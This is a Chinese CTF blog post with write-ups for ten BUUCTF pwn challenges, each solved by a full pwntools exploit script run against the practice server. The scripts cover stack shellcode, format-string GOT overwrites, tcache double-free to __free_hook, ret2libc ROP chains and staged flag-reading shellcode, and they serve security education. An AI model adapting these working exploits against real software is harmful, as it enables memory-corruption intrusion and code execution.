---
title: buuctf-pwn write-ups(11)
date: 2023-03-04 11:06:14
categories:
- write-ups
- buuctf 系列
---
# buu083-x_ctf_b0verfl0w

这道题一共可写50字节，其中可以覆盖返回地址，又有sub esp, 24h和jmp esp这样的gadget，可以直接在栈上写shellcode，但是对于50字节的利用比较紧凑，需要对shellcraft的汇编代码稍作修改。

其中将开头3个push改为2个，同时省去避免输入空字符所做的绕过，可以节省几个字节空间。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./b0verfl0w')
io = remote('node4.buuoj.cn', 27901)
elf = ELF('./b0verfl0w')

shell = '\
	push 0x68732f;\
	push 0x6e69622f;\
	mov ebx, esp;\
	push 0x6873;\
	xor ecx, ecx;\
	push ecx;\
	push 4;\
	pop ecx;\
	add ecx, esp;\
	push ecx;\
	mov ecx, esp;\
	xor edx, edx;\
	jmp .1;\
	pop eax;\
	pop eax;\
	pop eax;\
	pop eax;\
	.1:\
'

shell2 = '\
	push 11;\
	pop eax;\
	int 0x80;\
'

shellcode = asm(shell)
io.sendafter(b'name?\n', (p32(0x8048504) + shellcode[:0x20] + p32(0x80484fd) + asm(shell2)).ljust(50, b'a'))
io.interactive()
```

# buu084-picoctf_2018_leak_me
这道题利用strcat函数即可泄露口令。虽然每一次生成靶机的时候口令都不一样，但方便的做法就是先泄露一次然后再跑一次直接输口令。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./PicoCTF_2018_leak-me')
io = remote('node4.buuoj.cn', 28532)

password = b'a_reAllY_s3cuRe_p4s$word_f85406'

io.sendlineafter(b'name?\n', cyclic(256))

io.sendline(password)
io.interactive()
```

# buu085-inndy_echo
格式化字符串漏洞。
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./echo')
io = remote('node4.buuoj.cn', 28212)
elf = ELF('./echo')

io.sendline(b'%8$s' + p32(elf.got['fgets']))
fgets = u32(io.recv(4))
libc = LibcSearcher('fgets', fgets)
base = fgets - libc.dump('fgets')
system = base + libc.dump('system')
payload = fmtstr_payload(7, {elf.got['printf']: system})

io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
```

# buu086-hitcontraining_unlink
同第73题。

# buu087-ciscn_2019_final_3
从表面上来看，这是一道C++ pwn，但实际上就是一个普通的堆题。

只提供了2个选项：添加chunk和删除chunk，其中删除可以有double free，分配chunk只能分配0x78以内大小的chunk。每一次分配结束之后会返回堆地址。虽然本题我们获得了堆地址，但是程序和libc的加载地址都未知，而且看上去无法读取内存内容。

因此我们就必须考虑另辟蹊径。

思考一下，如果我们能够将chunk分配到main_arena中或者是__free_hook，那么分配之后的输出就能够让我们成功获取libc的地址。因此总的思路是：想尽办法将chunk分配到main_arena，获取libc地址后再想办法分配chunk到__free_hook。本题的libc版本为2.27-3ubuntu1，笔者的libc版本为2.27-3ubuntu1.6，这两个版本对于tcache的free操作不同，前者没有对于tcache的double free检查，而后者有，因此必须加上环境变量LD_PRELOAD选项。但即便如此，也只能勉强做题，因为没有dbg-symbols，我们无法在gdb中使用heap、bin等查看堆内容的关键性命令，这会使得做题变得很难受。不过由于这道题的出题时间比较早，出现这种情况也是完全可以理解的，做最近比赛的题目一般就不会有这种蛋疼的情况。

说回到本题上。本题利用仅有的一个输出机会的方式如下图所示：
![](1.png)

注：图中浅色chunk比深色chunk的大小小。

由于2.27-3ubuntu1版本中没有对tcache chunk的double free检测，我们甚至可以连续两次释放同一个chunk。释放后，首先分配一次出去，将fd指针修改到该chunk前面0x10字节，然后再一次分配，这一次分配就可以修改到这个chunk的大小，将其改成unsorted bin的范围，这样在free这个chunk之后，堆中就会出现2个相同的指向main_arena+96的地址。然后我们通过继续分配让这个chunk被切割，这里要注意一个细节，就是切割后main_arena+96的保存地址会修改，我们让这个地址被修改到下一个chunk的fd部分，再提前将这个chunk释放掉，这样tcache中就会链入main_arena+96的地址。如此操作之后，我们就能够向main_arena+96分配chunk。

这里还要注意一个细节，我们要将第2个chunk的大小设置得与其他的chunk不同，可以假设一下，如果实现分配的所有chunk大小都相同，那么释放的顺序应该是2、1、1，这样第1个chunk才能在后面的malloc中优先被分配。在malloc两次之后，第1个chunk的大小被成功修改，此时tcache中还有1个chunk，那就是chunk 2，此时若想要切割unsorted bin chunk，就必须首先分配第2个chunk，此时tcache为空，即使此时chunk 2中的fd被修改为了main_arena+96，我们也无法在这个地方分配chunk了，因为它已经无法被链入到tcache链表，只有当chunk 2在释放状态时修改fd指针才行。

有了libc的基地址之后，我们就可以如法炮制，通过double free将chunk轻松地分配到__free_hook，然后一次释放即可get shell。

```python
from pwn import *
context.log_level = 'debug'

# io = process(['./ciscn_final_3'])
io = remote('node4.buuoj.cn', 28938)
libc = ELF('./libc.so.6')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
heap_addr = [0] * 0x18

def add(index, size, content):
	sla(b'choice > ', b'1')
	sla(b'input the index\n', str(index).encode())
	sla(b'input the size\n', str(size).encode())
	sa(b'now you can write something\n', content)
	io.recvuntil(b'gift :0x')
	heap_addr[index] = int(io.recvuntil(b'\n', drop=True), 16)	

def delete(index):
	sla(b'choice > ', b'2')
	sla(b'input the index\n', str(index).encode())

add(0, 0x70, b'\n')
add(1, 0x40, b'\n')
add(2, 0x70, b'/bin/sh\n')
add(3, 0x60, b'\n')
add(4, 0x60, b'\n')
add(5, 0x60, b'\n')
add(6, 0x70, b'\n')
add(7, 0x70, b'\n')
add(8, 0x70, b'\n')

add(9, 0x10, b'\n')

delete(0)
delete(0)
delete(1)

add(10, 0x70, p64(heap_addr[0] - 0x10) + b'\n')
add(11, 0x70, b'\n')
add(12, 0x70, b'A' * 0x8 + p64(0x421) + b'\n')
delete(0)
add(13, 0x70, b'\n')
add(14, 0x40, b'\n')
add(15, 0x40, b'\x00')	# to main_arena + 96
__malloc_hook = heap_addr[15] - 0x70
base = __malloc_hook - libc.symbols['__malloc_hook']
log.info('libc base = ' + hex(base))
__free_hook = base + libc.symbols['__free_hook']
log.info('__free_hook = ' + hex(__free_hook))
system = base + libc.symbols['system']

delete(4)
delete(4)
add(16, 0x60, p64(__free_hook) + b'\n')
add(17, 0x60, b'\n')
add(18, 0x60, p64(system) + b'\n')
delete(2)
io.interactive()
```

# buu088-axb_2019_fmt64
和第85题神相似。
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process('./axb_2019_fmt64')
io = remote('node4.buuoj.cn', 26942)
elf = ELF('./axb_2019_fmt64')

io.sendlineafter(b'Please tell me:', b'%9$s\x00\x00\x00\x00' + p64(elf.got['puts']))
io.recvuntil(b'Repeater:')
puts = u64(io.recv(6) + b'\x00\x00')
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
print(hex(base))
print(hex(system))

payload = fmtstr_payload(8, {elf.got['strlen']: system}, numbwritten=9)

io.sendlineafter(b'Please tell me:', payload)

# gdb.attach(io, 'b *0x4008d0')
io.sendline(b'||/bin/sh')
io.interactive()
```

# buu089-wustctf2020_name_your_cat
直接溢出。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./wustctf2020_name_your_cat')
io = remote('node4.buuoj.cn', 29532)
elf = ELF('./wustctf2020_name_your_cat')

io.sendlineafter(b'Name for which?\n>', b'7')
io.sendlineafter(b'Give your name plz: ', p32(elf.symbols['shell']))

for i in range(4):
	io.sendlineafter(b'Name for which?\n>', b'1')
	io.sendlineafter(b'Give your name plz: ', b'A')
	
io.interactive()
```

# buu090-pwnme1
scanf直接溢出。
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./pwnme1')
io = remote('node4.buuoj.cn', 29037)
elf = ELF('./pwnme1')

io.sendlineafter(b'>> 6. Exit    \n', b'5')

payload = cyclic(0xA4 + 4)
payload += p32(elf.plt['puts'])
payload += p32(0x8048898)
payload += p32(elf.got['puts'])
payload += p32(elf.symbols['getfruit'])

io.sendlineafter(b'Please input the name of fruit:', payload)

io.recvuntil(b'...\n')
puts = u32(io.recv(4))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0xA4 + 4)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)

io.sendlineafter(b'Please input the name of fruit:', payload)

io.interactive()
```

# buu091-axb_2019_brop64
直接溢出。~~(怎么都90多题了还是这种简单题……)~~
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

poprdi_ret = 0x400963

# io = process('./axb_2019_brop64')
io = remote('node4.buuoj.cn', 27602)
elf = ELF('./axb_2019_brop64')

payload = cyclic(0xD0 + 8)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['repeater'])

io.sendlineafter(b'Please tell me:', payload)
io.recvuntil(b'\x09\x40')
puts = u64(io.recv(6) + b'\x00\x00')
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print(hex(base))
print(hex(system))

payload = cyclic(0xD0 + 8)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(system)

io.sendlineafter(b'Please tell me:', payload)

io.interactive()
```

# buu092-[极客大挑战 2019]Not Bad
这题考察shellcode，由于给定的写长度不够，可以采用边写边执行的方式，增加可写代码的长度。
```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process('./bad')
io = remote('node4.buuoj.cn', 28044)
elf = ELF('./bad')

poprdi_ret = 0x400b13

shellcode_1 = '\
	.1:\
	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \
	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \
	nop; nop; nop; nop; nop; nop; nop; nop; \
	jmp .1\
'

jmp_inst = asm(shellcode_1)[0x28:]

shellcode_2 = '\
	mov rsi, rsp;\
	sub rsi, 0x10;\
	xor rax, rax;\
	xor rdi, rdi;\
	mov rdx, 0x100;\
	syscall;\
'

sc1 = asm(shellcode_2).ljust(0x18, b'\x90')

payload = sc1 + p64(0)
payload += jmp_inst.ljust(8, b'\x90')	# change rbp
payload += p64(0x4009EE)

io.sendafter(b'Easy shellcode, have fun!\n', payload.ljust(0x38, b'\x00'))

data_seg = 0x601058

shellcode3 = '\
	xor rax, rax;\
	xor rdi, rdi;\
	mov rsi, 0x601058;\
	mov rdx, 6;\
	syscall;\
	mov rax, 2;\
	mov rdi, 0x601058;\
	xor rsi, rsi;\
	xor rdx, rdx;\
	syscall;\
	mov rdi, rax;\
	xor rax, rax;\
	mov rsi, rsp;\
	sub rsi, 0x40;\
	mov rdx, 0x30;\
	syscall;\
	mov rax, 1;\
	mov rdi, rax;\
	mov rsi, rsp;\
	sub rsi, 0x40;\
	mov rdx, 0x30;\
	syscall;\
'

io.send(asm(shellcode3).ljust(0x100, b'\x00'))
io.send(b'/flag\x00')


io.interactive()
```